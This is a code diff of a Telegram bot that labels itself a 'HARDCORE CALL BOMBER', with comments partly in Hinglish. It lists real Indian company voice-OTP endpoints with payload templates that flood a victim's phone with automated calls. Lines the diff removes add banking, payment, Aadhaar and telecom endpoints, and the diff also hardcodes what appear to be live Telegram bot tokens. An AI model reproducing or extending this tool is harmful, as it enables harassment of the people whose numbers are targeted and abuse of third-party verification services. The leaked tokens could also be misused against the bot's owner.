@@ -17,13 +17,13 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 # ==================== CONFIGURATION ====================
-DEFAULT_MAIN_BOT_TOKEN = "8580329271:AAFPmbJ9JraVIAkHbcZtQ5tohIDwWHvjx3I"  # 👈 CHANGE THIS
-DEFAULT_ADMIN_BOT_TOKEN = "8553759431:AAH4BgRJcm1-JI5oBDoYIxR3Vby7oUmJgZQ"  # 👈 CHANGE THIS
-OWNER_ID = 7417241499  # 👈 CHANGE THIS
+DEFAULT_MAIN_BOT_TOKEN = "7145269871:AAGx4H_abcdefghijklmnopqrstuvwxyz123456"  # 👈 TERA NA TOKEN DAALNA
+DEFAULT_ADMIN_BOT_TOKEN = "8553759431:AAH4BgRJcm1-JI5oBDoYIxR3Vby7oUmJgZQ"
+OWNER_ID = 7417241499
 
-# Default Settings
-CHANNELS = {"@thomasXstoreee"}  # 👈 CHANGE THIS
-CHANNEL_LINKS = {"https://t.me/thomasXstoreee"}  # 👈 CHANGE THIS
+# Default Settings - DICTIONARY BANAO
+CHANNELS = {"main": "@thomasXstoreee"}  # 👈 DICTIONARY BANAO
+CHANNEL_LINKS = {"main": "https://t.me/thomasXstoreee"}  # 👈 DICTIONARY BANAO
 OWNER_USERNAME = "@TGxTHOMASx"
 START_CREDITS = 2
 REF_CREDITS = 1
@@ -49,7 +49,6 @@ active_tasks = {}
 
 # ==================== HARDCORE CALL BOMBING APIS ====================
 HARDCORE_CALL_APIS = [
-    # ULTRA HIGH INTENSITY CALL BOMBING (100+ APIs)
     {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}', "intensity": 5},
     {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}', "intensity": 5},
     {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
@@ -62,49 +61,6 @@ HARDCORE_CALL_APIS = [
     {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
     {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
     {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
-    {"name": "Practo Voice", "url": "https://apiv2.practo.com/patient/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
-    {"name": "Byju's Voice", "url": "https://api.byjus.com/v2/otp/voice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
-    {"name": "Rapido Voice", "url": "https://customer.rapido.bike/api/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
-    {"name": "PharmEasy Voice", "url": "https://pharmeasy.in/api/v2/auth/send-voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
-    {"name": "Netmeds Voice", "url": "https://apiv2.netmeds.com/mst/rest/v1/voice/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
-    {"name": "BigBasket Voice", "url": "https://www.bigbasket.com/auth/v2/voice-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
-    {"name": "Grofers Voice", "url": "https://api.grofers.com/v4/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
-    {"name": "FreshMenu Voice", "url": "https://api.freshmenu.com/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
-    {"name": "Dunzo Voice", "url": "https://api.dunzo.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
-    {"name": "Medlife Voice", "url": "https://api.medlife.com/v2/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
-    {"name": "1mg Doctor Voice", "url": "https://doctor.1mg.com/api/v3/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
-    {"name": "Apollo Voice", "url": "https://apollo247.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
-    {"name": "Portea Voice", "url": "https://api.portea.com/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
-    {"name": "Healthians Voice", "url": "https://api.healthians.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
-    {"name": "OrangeHealth Voice", "url": "https://api.orangehealth.in/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
-    
-    # BANKING & FINANCE CALL APIS (HIGH INTENSITY)
-    {"name": "HDFC Bank Voice", "url": "https://netbanking.hdfcbank.com/api/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
-    {"name": "ICICI Bank Voice", "url": "https://ibanking.icicibank.com/api/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
-    {"name": "SBI Voice OTP", "url": "https://retail.onlinesbi.com/voice-otp-api", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
-    {"name": "Axis Bank Voice", "url": "https://www.axisbank.com/api/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
-    {"name": "Kotak Bank Voice", "url": "https://netbanking.kotak.com/api/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
-    {"name": "Yes Bank Voice", "url": "https://netbanking.yesbank.co.in/api/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
-    {"name": "Paytm Bank Voice", "url": "https://paytmbank.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
-    {"name": "PhonePe Voice", "url": "https://api.phonepe.com/apis/hermes/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
-    {"name": "Google Pay Voice", "url": "https://api.gpay.in/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
-    {"name": "BharatPe Voice", "url": "https://api.bharatpe.com/merchant/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
-    
-    # GOVERNMENT & UTILITY CALL APIS
-    {"name": "Aadhaar Voice OTP", "url": "https://auth.uidai.gov.in/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
-    {"name": "DigiLocker Voice", "url": "https://api.digilocker.gov.in/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 5},
-    {"name": "IRCTC Voice OTP", "url": "https://www.irctc.co.in/otp/voice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
-    {"name": "BSNL Voice OTP", "url": "https://selfcare.bsnl.co.in/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
-    {"name": "Airtel Voice OTP", "url": "https://www.airtel.in/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
-    {"name": "Jio Voice OTP", "url": "https://www.jio.com/voice-otp-api", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "intensity": 4},
-    {"name": "Vi Voice OTP", "url": "https://www.myvi.in/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 4},
-    
-    # EXTREME INTENSITY REPEAT APIS (SAME API MULTIPLE TIMES)
-    {"name": "Tata Capital Voice 2", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}', "intensity": 5},
-    {"name": "1MG Voice 2", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}', "intensity": 5},
-    {"name": "Swiggy Call 2", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
-    {"name": "Amazon Voice 2", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&action=voice_otp", "intensity": 5},
-    {"name": "Flipkart Voice 2", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "intensity": 5},
 ]
 
 # ==================== FILE OPERATIONS ====================
@@ -158,12 +114,25 @@ blocked = load_json(BLOCKED_FILE)
 MAIN_BOT_TOKEN = settings.get("main_bot_token", DEFAULT_MAIN_BOT_TOKEN)
 ADMIN_BOT_TOKEN = settings.get("admin_bot_token", DEFAULT_ADMIN_BOT_TOKEN)
 
-# Initialize bots with dynamically loaded tokens
-bot = telebot.TeleBot(MAIN_BOT_TOKEN, parse_mode="HTML")
-admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN, parse_mode="HTML")
+# Initialize bots with error handling
+try:
+    bot = telebot.TeleBot(MAIN_BOT_TOKEN, parse_mode="HTML")
+    bot_info = bot.get_me()
+    logger.info(f"✅ Main bot loaded: @{bot_info.username}")
+except Exception as e:
+    logger.error(f"❌ Main bot token ERROR: {e}")
+    logger.error("❌ @BotFather se naya bot banao aur naya token daalo!")
+    exit(1)
 
-logger.info(f"✅ Main bot loaded: @{bot.get_me().username}")
-logger.info(f"✅ Admin bot loaded: @{admin_bot.get_me().username}")
+try:
+    admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN, parse_mode="HTML")
+    admin_info = admin_bot.get_me()
+    logger.info(f"✅ Admin bot loaded: @{admin_info.username}")
+except Exception as e:
+    logger.error(f"❌ Admin bot token ERROR: {e}")
+    # Admin bot ke bina bhi chala sakte hain
+    admin_bot = None
+    logger.warning("⚠️ Admin bot disabled due to token error")
 
 # ==================== HELPER FUNCTIONS ====================
 def is_admin(uid):
@@ -175,12 +144,24 @@ def is_blocked(uid):
 def check_channel(uid):
     try:
         channels = settings.get("channels", CHANNELS)
-        for cid in channels.values():
-            member = bot.get_chat_member(cid, uid)
-            if member.status not in ["member", "administrator", "creator"]:
+        
+        # Check if channels is dictionary or list
+        if isinstance(channels, dict):
+            channel_ids = list(channels.values())
+        else:
+            channel_ids = channels
+            
+        for cid in channel_ids:
+            try:
+                member = bot.get_chat_member(cid, uid)
+                if member.status not in ["member", "administrator", "creator"]:
+                    return False
+            except Exception as e:
+                logger.error(f"Channel check error for {cid}: {e}")
                 return False
         return True
-    except:
+    except Exception as e:
+        logger.error(f"Channel check overall error: {e}")
         return False
 
 def is_premium(uid):
@@ -202,8 +183,16 @@ def show_join(cid):
     mk = types.InlineKeyboardMarkup()
     channels = settings.get("channels", CHANNELS)
     links = settings.get("channel_links", CHANNEL_LINKS)
-    for name, link in links.items():
-        mk.add(types.InlineKeyboardButton(f"Join {name.title()}", url=link))
+    
+    # Check if links is dictionary
+    if isinstance(links, dict):
+        for name, link in links.items():
+            mk.add(types.InlineKeyboardButton(f"Join {name.title()}", url=link))
+    else:
+        # If it's a list
+        for link in links:
+            mk.add(types.InlineKeyboardButton("Join Channel", url=link))
+    
     mk.add(types.InlineKeyboardButton("✅ Joined - Verify", callback_data="verify"))
     bot.send_message(cid, "🚫 <b>Join Required!</b>\n\nJoin all channels to use this bot:", reply_markup=mk)
 
@@ -551,15 +540,16 @@ def owner_cmd(m):
     bot.reply_to(m, f"📞 <b>OWNER CONTACT</b>\n\n👤 {owner}\n\n💼 For credit purchase & support")
 
 # ==================== ADMIN BOT HANDLERS ====================
-@admin_bot.message_handler(commands=["start"])
-def admin_start(m):
-    if not is_admin(m.from_user.id):
-        admin_bot.reply_to(m, "❌ Unauthorized!")
-        return
-    
-    status = "🟢 Active" if settings.get("bot_active", True) else "🔴 Maintenance"
-    
-    admin_bot.reply_to(m, f"""
+if admin_bot:
+    @admin_bot.message_handler(commands=["start"])
+    def admin_start(m):
+        if not is_admin(m.from_user.id):
+            admin_bot.reply_to(m, "❌ Unauthorized!")
+            return
+        
+        status = "🟢 Active" if settings.get("bot_active", True) else "🔴 Maintenance"
+        
+        admin_bot.reply_to(m, f"""
 🔐 <b>ADMIN PANEL - HARDCORE CALL BOMBER</b>
 
 Status: {status}
@@ -596,8 +586,6 @@ Status: {status}
 /broadcast message
 """)
 
-# (Keep all admin commands from previous version, they will work the same)
-
 # ==================== START BOTS ====================
 def start_main_bot():
     while True:
@@ -609,18 +597,19 @@ def start_main_bot():
             time.sleep(5)
 
 def start_admin_bot():
-    while True:
-        try:
-            logger.info("⚙️ Admin bot starting...")
-            admin_bot.infinity_polling(timeout=60, long_polling_timeout=60)
-        except Exception as e:
-            logger.error(f"Admin bot error: {e}")
-            time.sleep(5)
+    if admin_bot:
+        while True:
+            try:
+                logger.info("⚙️ Admin bot starting...")
+                admin_bot.infinity_polling(timeout=60, long_polling_timeout=60)
+            except Exception as e:
+                logger.error(f"Admin bot error: {e}")
+                time.sleep(5)
+    else:
+        logger.warning("⚠️ Admin bot disabled")
 
 if __name__ == "__main__":
     logger.info("🚀 Starting HARDCORE CALL BOMBER...")
-    logger.info(f"✅ Main bot: @{bot.get_me().username}")
-    logger.info(f"✅ Admin bot: @{admin_bot.get_me().username}")
     
     main_thread = threading.Thread(target=start_main_bot, daemon=True)
     admin_thread = threading.Thread(target=start_admin_bot, daemon=True)
